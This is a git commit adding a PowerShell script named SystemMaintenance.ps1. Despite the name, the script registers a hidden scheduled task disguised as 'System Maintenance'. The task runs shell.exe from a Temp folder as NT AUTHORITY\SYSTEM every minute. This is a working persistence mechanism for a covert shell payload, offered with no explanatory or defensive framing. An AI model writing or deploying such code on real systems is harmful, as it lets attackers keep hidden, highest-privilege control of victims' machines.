512a0d247b26a84207cae427c0fab10a51c610a9
vanluong <127461439+vanluongkma@users.noreply.github.com>
2025-03-12 19:00:11 +0700

    Create SystemMaintenance.ps1

---
+++ SystemMaintenance.ps1
@@ -0,0 +1,10 @@
+$taskName = "System Maintenance"
+$exePath = "C:\Users\Administrator\AppData\Local\Temp\shell.exe"
+$action = New-ScheduledTaskAction -Execute $exePath
+$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1)
+$settings = New-ScheduledTaskSettingsSet -Hidden
+$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
+Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
+
+Write-Host "Scheduled task '$taskName' created successfully."
